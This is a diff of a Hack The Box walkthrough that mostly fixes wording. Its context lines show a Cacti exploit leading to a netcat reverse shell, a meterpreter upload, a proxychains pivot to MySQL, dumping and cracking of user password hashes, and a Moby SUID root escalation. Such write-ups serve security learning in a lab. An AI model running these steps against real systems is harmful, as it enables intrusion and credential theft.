@@ -34,8 +34,7 @@ What does the website reveal?
 Googling for an exploit for `Cacti 1.2.22` results in the following GitHub repository
 `https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22`
 
-To get code exeucution on the server we simply need to setup a listener and fire the exploit
-Listener on attacker machine
+To get code exeucution on the server we simply need to setup a listener and fire the exploit on attacker machine
 ```bash
 $ nc -lvp 80          
 listening on [any] 80 ...
@@ -64,7 +63,7 @@ www-data@50bca5e748b0:/var/www/html$
 > Yes we got code exuection!
 {: .prompt-info }
 
-However, we see that we have an unprivilged user (`www-data`) and we are in a docker container which is indicated by the hostname `50bca5e748b0`
+However, we see that we have an unprivilged user (`www-data`) and we are in a docker container which is indicated by the hostname `50bca5e748b0`.
 {: .prompt-danger }
 
 ---
@@ -119,9 +118,10 @@ fi
 exec "$@"
 ```
 
-We see the container connects to a `mysql` instance with the credentials `root:root`. The next step is to connect to this `mysql` instance to have a closer look if we can utilize the data in the database to elevate our privileges. Therefor we need to find out what host the script is connecting to. 
+We see the container connects to a `mysql` instance with the credentials `root:root`. Our next step is to connect to this `mysql` instance to have a closer look if we can utilize the data in the database to elevate our privileges. Therefor we need to find out what host the script is connecting to. 
 
-> As the docker instance is missing useful commands like `netstat`, `ip` and more we at first generate a `meterpreter`, upload it to the target to get a more stable and powerful access.
+> As the docker instance is missing useful commands like `netstat`, `ip` and more we at first generate a `meterpreter` and upload it to the target to get a more stable and powerful access.
+{: .prompt-info }
 
 Generate a `meterpreter` instance
 ```bash
@@ -263,7 +263,7 @@ msf6 auxiliary(server/socks_proxy) > run
 msf6 auxiliary(server/socks_proxy) >
 ```
 
-We know have all routes set up and a socks proxy is listening on our kali machine on port `1080`.
+We now have all routes set up and a socks proxy is listening on our kali machine on port `1080`.
 Now we make sure that our `proxychains` config is set correctly (`/etc/proxychains.conf`)
 ```
 ...
@@ -309,7 +309,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MySQL [(none)]>
 ```
 
-> It worked
+> It worked!
 {: .prompt-info }
 
 Lets look for juicy data
@@ -344,7 +344,7 @@ MySQL [cacti]> select * from user_auth;
 3 rows in set (0.066 sec)
 ```
 
-> We found 2 accounts with password hashes
+> We found two accounts with password hashes
 {: .prompt-info }
 
 ```
@@ -376,7 +376,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-06 12:21:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-06 12:21:07
 ```
 
-> Yes the creds work
+> Yes the credentials work.
 {: .prompt-info }
 
 ```bash
@@ -473,22 +473,21 @@ Security Team
 Nice! We got an email from the security team with vulnerabilities they identified on the system.
 Lets go through these vulnerabilities.
 - `CVE-2021-33033`: This is a kernel exploit. As on the target system is no `gcc`  installed and we are working on a HTB machine it is unlikely that they want us to use this exploit for the privilege escalation. Otherwise this would be worth a check.
-- `CVE-2020-25706`: This is an XSS vulnerability and not therefore not useful to gain higher privileges in this context
+- `CVE-2020-25706`: This is an XSS vulnerability and therefore not useful to gain higher privileges in this context
 - `CVE-2021-41091`: This one looks interesting as Moby is installed!
 
 Researching for `CVE-2021-41091` shows the following GitHub repository
 
-> `https://github.com/UncleJ4ck/CVE-2021-41091`
+> https://github.com/UncleJ4ck/CVE-2021-41091
 {: .prompt-info }
 
-What do we need to use this exploit? and get `root` on the host?
-- We need the file `exp.sh` on the system and execute it as user `marcus`
-- We need an active docker container where `/bin/bash` has the SUID flag set
+What do we need to use this exploit?
+- `exp.sh` on the system and execute it as user `marcus`
+- An active docker container where `/bin/bash` has the SUID flag set
 
-So we need to take a step back, access the docker instance again and perform a privilege escalation there to get `root` and set the SUID bit on `/bin/bash`
+So we need to take a step back, access the docker instance again and perform privilege escalation there to get `root` and set the SUID bit on `/bin/bash`
 
-Access docker machine again
-Look for dangerous binaries which have the SUID flag
+After accessing the docker machine again we look for dangerous binaries which have the SUID flag.
 ```bash
 bash-5.1$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 <u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -586,7 +585,7 @@ bash-5.1# id
 uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
 ```
 
-> Yes! our `euid` is `root`!
+> Yes! Our `euid` is `root`!
 {: .prompt-info }
 
 ## root flag
@@ -598,5 +597,5 @@ bash-5.1# cat root.txt
 e******************************0
 ```
 
-H4&L0
+H4&L0  
 Pwned! <@:-)
